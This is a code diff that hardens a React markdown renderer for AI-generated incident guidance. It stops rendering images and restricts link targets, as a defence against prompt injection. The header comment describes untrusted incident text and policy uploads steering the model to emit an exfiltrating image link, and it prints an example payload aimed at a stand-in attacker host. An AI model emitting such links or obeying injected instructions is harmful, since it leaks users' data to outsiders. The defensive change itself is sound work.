@@ -11,7 +11,41 @@ import remarkGfm from 'remark-gfm';
  *
  * Component overrides rather than a prose plugin, so the type scale is the
  * design's own: serif for section headings, DM Sans 15/1.65 for body.
+ *
+ * **This renders model output, and model output is downstream of two untrusted
+ * inputs**: the administrator's incident text and the policy documents an
+ * uploader supplies. So it is a prompt-injection sink. `img` and `a` are
+ * constrained accordingly:
+ *
+ * - `img` is not rendered at all. A remote image is a GET the browser makes
+ *   with no interaction, so `![](https://attacker/?d=<summary>)` in model
+ *   output exfiltrates whatever the model was persuaded to put in the query
+ *   string -- and because guidance is persisted, it re-fires for every later
+ *   viewer of the incident. Guidance has no legitimate need for images; the
+ *   alt text is shown instead so nothing is silently dropped.
+ * - `a` is restricted to http(s) and relative targets, and carries
+ *   `rel="noopener noreferrer nofollow"`. A `javascript:` href would be script
+ *   execution on this origin; `noreferrer` keeps the incident URL out of the
+ *   Referer sent to whatever a link points at.
+ *
+ * (SEC-33, the egress half of SEC-25)
  */
+
+/**
+ * Allow only targets that cannot execute and cannot be a credential-bearing
+ * scheme. Anything else renders as plain text.
+ */
+function safeHref(href: string | undefined): string | undefined {
+  if (!href) return undefined;
+  const value = href.trim();
+  if (value.startsWith('/') || value.startsWith('#')) return value;
+  try {
+    const url = new URL(value);
+    return url.protocol === 'http:' || url.protocol === 'https:' ? value : undefined;
+  } catch {
+    return undefined;
+  }
+}
 export function GuidanceBlock({ children }: { children: string }) {
   return (
     <div className="flex flex-col gap-3 text-[15px] leading-[1.65] text-text-secondary">
@@ -45,10 +79,26 @@ export function GuidanceBlock({ children }: { children: string }) {
           li: ({ children }) => <li className="text-[15px] leading-[1.6]">{children}</li>,
           strong: ({ children }) => <strong className="font-medium text-text">{children}</strong>,
           em: ({ children }) => <em className="italic">{children}</em>,
-          a: ({ href, children }) => (
-            <a href={href} className="underline underline-offset-2 hover:text-text">
-              {children}
-            </a>
+          a: ({ href, children }) => {
+            const safe = safeHref(href);
+            if (!safe) return <span>{children}</span>;
+            return (
+              <a
+                href={safe}
+                rel="noopener noreferrer nofollow"
+                className="underline underline-offset-2 hover:text-text"
+              >
+                {children}
+              </a>
+            );
+          },
+          // Not rendered: a remote image is an unprompted outbound GET, and
+          // this is model output. The alt text is kept so the reader can see
+          // that something was there.
+          img: ({ alt }) => (
+            <span className="text-[13px] text-text-muted">
+              {alt ? `[image: ${alt}]` : '[image omitted]'}
+            </span>
           ),
           code: ({ children }) => (
             <code className="tabular rounded bg-input px-1.5 py-0.5 text-[13px] text-text">
